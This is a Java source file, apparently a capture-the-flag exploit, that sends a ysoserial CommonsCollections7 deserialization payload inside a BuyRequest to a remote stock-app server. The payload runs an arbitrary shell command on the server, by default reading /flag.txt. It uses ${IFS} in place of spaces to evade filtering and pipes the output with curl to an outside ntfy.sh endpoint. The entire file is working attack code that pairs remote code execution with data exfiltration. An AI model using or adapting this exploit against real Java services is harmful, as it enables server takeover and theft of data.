package myapp.ctf.client;

import myapp.ctf.client.ServerConnection;
import com.ctf.stockapp.common.protocol.BuyRequest;


import ysoserial.payloads.CommonsCollections7;

public class FinalExploit {
    public static String server = "team54-thickapp.durhack.qwerty.technology";
    public static int port = 9999;
    public static ServerConnection connection;


    public static Object createPayload(String command) {
        try {
            return new CommonsCollections7().getObject(command);
        } catch (Exception e) {
            System.out.println("Failed to create attack payload.");
            System.exit(1);
            return new Object();
        }
        
    }

    public static void doAttack(String cmd) {

        Object payload = createPayload(cmd);
        BuyRequest request = new BuyRequest();
        request.setData(payload);
        
        System.out.println("Sending request!");
        try {
            connection.sendRequest(request);
        } catch (Exception e) {
            System.out.println("ERROR: failed to send request!");
        }
    }

    public static void main(String[] args) {
        connection = new ServerConnection(server, port);

        String user_command = args.length > 0 ? args[0] : "cat /flag.txt";

        // We need to ensure that no spaces are included in the command string, as we can't escape it with quotations, we can do this with the standard unix
        // IFS env variable.
        user_command = user_command.replace(" ", "${IFS}");
        String attack_command = "/usr/bin/env bash -c " + user_command + "|curl${IFS}-s${IFS}-d@-${IFS}https://ntfy.sh/durhack-x";

        System.out.println("Prepared payload: " + attack_command);

        doAttack(attack_command);
    }
}
